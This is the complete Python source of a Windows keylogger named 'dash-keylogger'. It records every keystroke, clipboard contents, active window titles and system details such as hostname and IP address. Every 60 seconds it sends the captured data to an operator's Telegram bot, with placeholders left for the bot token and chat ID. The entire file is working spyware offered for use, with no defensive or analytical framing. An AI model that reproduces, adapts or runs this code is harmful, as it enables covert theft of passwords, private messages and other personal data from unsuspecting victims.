import os
import platform
import socket
import threading
import requests
import ctypes
import win32clipboard
from pynput import keyboard

# Replace with your Telegram Bot Token and Chat ID
TELEGRAM_BOT_TOKEN = 'Replace with your bot id'
TELEGRAM_CHAT_ID = 'Replace with your chat id'

class KeyLogger:
    def __init__(self, time_interval, bot_token, chat_id):
        self.interval = time_interval
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log = ""
        self.initial_report_sent = False
        self.clipboard_content = ""
        self.current_window_title = ""
        self.is_shift_on = False
        self.is_ctrl_on = False
        self.is_alt_on = False
        self.is_caps_lock_on = False

        self.special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[Enter]",
            keyboard.Key.tab: "[Tab]",
            keyboard.Key.backspace: "[Backspace]",
            keyboard.Key.delete: "[Delete]",
            keyboard.Key.shift: "[Shift]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.caps_lock: "[Caps Lock]",
        }

    def get_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        os_version = platform.version()
        pc_name = hostname  # Using hostname as the PC name

        system_info = (
            f"dash-keylogger started...\n\n"
            f"Hostname: {hostname}\n"
            f"PC Name: {pc_name}\n"
            f"IP Address: {ip}\n"
            f"Processor: {plat}\n"
            f"System: {system}\n"
            f"Machine: {machine}\n"
            f"OS Version: {os_version}"
        )
        return system_info

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {
            'chat_id': self.chat_id,
            'text': message
        }
        try:
            response = requests.post(url, data=data)
            response.raise_for_status()
            print("Telegram message sent successfully")
        except requests.RequestException as e:
            print(f"Failed to send Telegram message: {e}")

    def format_log(self):
        formatted_log = self.log.strip()
        return f"Windows Title:\n{self.current_window_title}\n\nClipboard:\n{self.clipboard_content}\n\nKeystrokes:\n{formatted_log}"

    def save_data(self, key):
        if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            self.is_shift_on = True
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.is_ctrl_on = True
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            self.is_alt_on = True
        elif key == keyboard.Key.caps_lock:
            self.is_caps_lock_on = not self.is_caps_lock_on
        else:
            try:
                if key.char:
                    if self.is_shift_on:
                        self.log += key.char.upper()
                    else:
                        if self.is_caps_lock_on:
                            self.log += key.char.upper()
                        else:
                            self.log += key.char
            except AttributeError:
                if self.is_ctrl_on:
                    self.log += f"[CTRL+{key.name.upper()}]"
                elif self.is_alt_on:
                    self.log += f"[ALT+{key.name.upper()}]"
                else:
                    self.log += self.special_keys.get(key, f"[{key.name.upper()}]")

        if key == keyboard.Key.enter:
            self.log += " [Enter]"

    def capture_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            self.clipboard_content = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        except:
            self.clipboard_content = "Clipboard access denied or empty"

    def capture_window_title(self):
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        title = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, title, length + 1)
        self.current_window_title = title.value

    def report(self):
        if not self.initial_report_sent:
            system_info = self.get_system_info()
            self.send_telegram_message(system_info)
            self.initial_report_sent = True
        else:
            formatted_log = self.format_log()
            self.send_telegram_message(formatted_log)
        self.log = ""
        threading.Timer(self.interval, self.report).start()

    def run(self):
        # Initial system report
        self.report()

        # Start the keyboard listener
        with keyboard.Listener(on_press=self.save_data, on_release=self.reset_modifiers) as listener:
            while True:
                self.capture_clipboard()
                self.capture_window_title()
                listener.join(1)

    def reset_modifiers(self, key):
        if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            self.is_shift_on = False
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.is_ctrl_on = False
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            self.is_alt_on = False

if __name__ == "__main__":
    keylogger = KeyLogger(time_interval=60, bot_token=TELEGRAM_BOT_TOKEN, chat_id=TELEGRAM_CHAT_ID)  # 60 seconds interval
    keylogger.run()
